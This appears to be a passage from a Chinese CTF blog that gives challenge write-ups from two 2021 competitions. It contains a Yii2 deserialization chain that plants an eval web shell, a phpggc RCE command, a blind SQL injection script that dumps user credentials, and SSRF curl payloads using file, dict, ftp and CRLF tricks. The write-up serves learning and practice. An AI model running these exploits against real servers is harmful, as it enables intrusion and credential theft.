class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(&quot;/var/www/html/web/j.php&quot;, \&#x27;&lt;?php eval($_POST[&quot;s&quot;]); ?&gt;\&#x27;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入一句话，连接</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555774324-8c39390a-fbd4-499c-a5de-d2d5d2a8f2f6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555774324-8c39390a-fbd4-499c-a5de-d2d5d2a8f2f6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>因为有 <code>disable function</code> 限制执行命令，因此需要bypass</p><p>尝试常用bypass 方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555800061-0f07040a-1cfb-49d1-802a-b01a39ae7566.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620555800061-0f07040a-1cfb-49d1-802a-b01a39ae7566.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>无效，然后下面链接有一些姿势没来得及试，等复现出来可以试试</p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>坐等其他师傅WP （</p><p>5月12日更新</p><hr><p>突然发现了<a href="https://mp.weixin.qq.com/s/eMJ-tQ4qkTWpJBK244EOzQ">简单的做法</a>，没想到 <a href="https://github.com/ambionics/phpggc">phpggc</a> 自定义代码功能还挺好用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc Yii2/RCE2 <span class="string">&#x27;eval($_REQUEST[&quot;ant&quot;]);&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>然后绕过 disable function 的方法是 <code>Apache_mode_cgi</code>，晚些搭环境看看为啥比赛时我没法成功绕过的..</p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>注入点在 <code>image.php</code></p><p>二分法时间延迟注入</p><blockquote><p>脚本来自 <a href="https://www.yuque.com/challenger-sfhjb">Challenger</a> 师傅</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zefme7yqvztnh81ouvm.cloudeci1.ichunqiu.com/image.php?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">        content = <span class="string">&quot;select/**/group_concat(username,&#x27;:&#x27;,password)/**/from/**/users&quot;</span></span><br><span class="line">        sql = <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>,1,2)&quot;</span></span><br><span class="line">        url2 = url+sql</span><br><span class="line">        r = requests.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r.content) == <span class="number">50811</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> low == high == <span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>((high + low - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620548212125-588334b9-30ac-4a6f-a233-38ef1aba93ce.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620548212125-588334b9-30ac-4a6f-a233-38ef1aba93ce.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png" style="zoom:50%;" /><p>使用 <code>admin</code> 和 <code>密码</code> 登录后 <code>SSRF</code> 即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620548915337-575e909e-c33a-42a5-a41a-79f29841aee6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620548915337-575e909e-c33a-42a5-a41a-79f29841aee6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>5月12日更新</p><hr><p>看到有人说 <code>modify.php</code> 是可以未授权访问的…</p><h2 id="ezlight"><a href="#ezlight" class="headerlink" title="ezlight"></a>ezlight</h2><p>还没看。。。撇了一眼源码，好像是 Laravel？出题人怕不是在 ctfshow 出题的。。</p><p>一个 Yii2 一个 Laravel。。。</p><p>5月12日更新</p><hr><p>晚点如果有环境就复现吧（</p><p><a href="https://mp.weixin.qq.com/s/KW71pe53aiU5CePUsxSOUA">先放一下有第四题wp的题解</a> </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>emm，不知怎么回事，第一题一开始访问 <code>.1ndexx.php.swp</code> 竟然没反应，当然还试了 <code>gedit</code> 的 <code>xx~</code>，佛了</p><p>第二题，，一开始 <code>assert</code> 用不了，说什么参数不能是可控的，后面又行了，，这中间找函数和尝试浪费了好多好多时间。。。导致后面绕过 disable function 时间不够。</p><p>第三题，总体难度不大 （逃</p><p>反思：</p><p>虽然之前看了很多 disable function bypass 的文章，但是没动手做过，不够熟练，</p><div class="note todo yellow"><p>把常用 disable function bypass 过一遍</p></div><div class="note todo yellow"><p>刷了部分然后一直在吃灰的 sqli-labs 是时候理理了…</p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021CSTC网络安全技术大赛 Writeup</title>
      <link href="//p/2021/2021CSTC-ctf/"/>
      <url>//p/2021/2021CSTC-ctf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>这次比赛打完，发现自己还是太菜了。。</p><p>虽然排名还可以 （因为有逆向大佬在。。。</p><p>web2和web3 感觉接近了，现把做出来的写上</p><p>看看后面有复现环境会复现，没有的话看下其他师傅的写写复盘。</p><p>由于web2和3实在没思路了，然后顺手解了2个简单的杂项。</p><p>这里要吐槽一点，为什么题目不是下发 docker 容器形式的，，这样别人如果 getshell 不就可以改代码逻辑搞破坏了吗？</p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$a</span>))&#123;</span><br><span class="line">   is_numeric(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])&#123;</span><br><span class="line">       (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]&gt;<span class="number">2021</span>)?<span class="variable">$v1</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(count(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">       <span class="variable">$pos</span> = array_search(<span class="string">&quot;nudt&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;a2&quot;</span>]);</span><br><span class="line">       <span class="variable">$pos</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">           <span class="variable">$val</span>===<span class="string">&quot;nudt&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$v2</span>=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$c</span>[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp(<span class="variable">$c</span>[<span class="number">1</span>],<span class="variable">$d</span>) &amp;&amp; <span class="variable">$c</span>[<span class="number">1</span>]!==<span class="variable">$d</span>)&#123;</span><br><span class="line">       eregi(<span class="string">&quot;3|1|c&quot;</span>,<span class="variable">$d</span>.<span class="variable">$c</span>[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       strpos((<span class="variable">$c</span>[<span class="number">0</span>].<span class="variable">$d</span>), <span class="string">&quot;cstc2021&quot;</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span> &amp;&amp; <span class="variable">$v3</span>)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>bar1</code> 和 <code>bar2</code> 凑一下</p><p><code>eregi</code>函数可用 <code>%00</code> 截断，在凑一下 <code>bar3</code> 即可</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.232.167.183:30001/?foo=&#123;%22bar1%22:%222022a%22,%22bar2%22:[[1],2,3,4,5],%22a2%22:[%22nudt%22]&#125;&amp;cat[0]=%00cstc2021&amp;cat[1][0]=1&amp;dog=222</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag{c32b71bb4aa5c4b2e7a8453f012f9c3e}</p><h2 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h2><p>提示1：</p><blockquote><p><a href="http://49.232.167.183:30012/swagger-ui.html">http://49.232.167.183:30012/swagger-ui.html</a></p></blockquote><p>提示2：</p><blockquote><p>已经拿到管理员token的队伍，关注/home/index接口</p></blockquote><p>登录爆破获取token</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620196738603-c7fb0bc4-7cb0-4441-ad31-45c95afe84da.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620196738603-c7fb0bc4-7cb0-4441-ad31-45c95afe84da.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>不过这个 token 无效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63a44f5fd4368923e62469611d232a02</span><br></pre></td></tr></table></figure><p>爆破 <code>/uid</code> 接口</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198371838-dc9660fe-9e86-4fa1-81fc-c79a00ee52aa.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198371838-dc9660fe-9e86-4fa1-81fc-c79a00ee52aa.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;用户ID&quot;:&quot;987&quot;,&quot;用户组&quot;:&quot;系统管理员&quot;,&quot;用户名&quot;:&quot;ctf_admin&quot;,&quot;HASH&quot;:&quot;2773d5bd7e1a7a7eec619c6d5fbdfd3a&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;用户ID&quot;:&quot;101&quot;,&quot;用户组&quot;:&quot;普通用户&quot;,&quot;用户名&quot;:&quot;test&quot;,&quot;HASH&quot;:&quot;098f6bcd4621d373cade4e832627b4f6&quot;&#125;</span><br></pre></td></tr></table></figure><p>md 碰撞出密码得到 Token</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198529598-06e947b4-a983-4a12-ab1a-29ff8470990b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198529598-06e947b4-a983-4a12-ab1a-29ff8470990b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9c618e664319512ef7db2d3c0672bee0</span><br></pre></td></tr></table></figure><p>访问不到时，会返回 <code>????</code></p><p>尝试了以下 EXP和一些变形，不过都读不到 flag，，害</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxxx/1.txt&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxxx/t1.php&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=dict://127.0.0.1:6379/_info%250a&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=file:///flag&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://0:30012/image/hacker.jpg&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxx:2233/&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxx5:2233/ HTTP/1.1\r\n\r\nGET / HTTP/1.1\r\nHost: 119.28.15.55:2233\r\n\r\nGET / HTTP/1.1\r\ntest:&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://49.232.167.183:30012/&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure><p>服务端是java来的，但感觉禁用了 file 之类的协议，，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>不过不知道怎样利用，，卡在这了</p><p>2021.5.6 17:17 更新</p><hr><p>麻了，看了别人题解</p><p><a href="https://blog.csdn.net/m0_51078229/article/details/116423096">https://blog.csdn.net/m0_51078229/article/details/116423096</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://127.0.0.1/flag.txt&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure><p>这个 <code>flag.txt</code> 在哪是猜的还是哪里有提示的？要是因为猜不到文件名而做不出来也太那啥了。。</p><p>2021.5.6 22:03 更新</p><hr><p><a href="https://blog.csdn.net/qyCraner/article/details/116459918">https://blog.csdn.net/qyCraner/article/details/116459918</a></p><p>又找了个题解，发现发送请求请求 ftp 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=ftp://127.0.0.1:21/&quot;</span> -H  <span class="string">&quot;accept: */*&quot;</span> -H  <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure><p>会返回文件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--   1 root     root           39 Apr 30 09:56 flag.txt</span><br></pre></td></tr></table></figure><p>然后在读取就好了….这个试起来有点小麻烦感觉， ，主要是不知道协议、IP和端口…而且题目速度访问速度贼慢，题目本身会保持连接，burp不方便fuzz，这一点感觉要找（弄）个工具</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>目录爆破得 <code>robots.txt</code> &gt; 然后访问 <code>PassOn</code> &gt;</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>&gt; 得到源码 <a href="http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip">http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip</a></p><p>结合源码<code>reset.php</code>， 其实密码就是时间戳部分，<code>sha1</code> 哈希，取前面 20位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = substr(hash(<span class="string">&#x27;sha1&#x27;</span>, gmdate(<span class="string">&quot;l jS \of F Y h:i:s A&quot;</span>)), <span class="number">0</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><p>然后帐号和邮箱在 <code>css/style.css</code> 注释里</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" 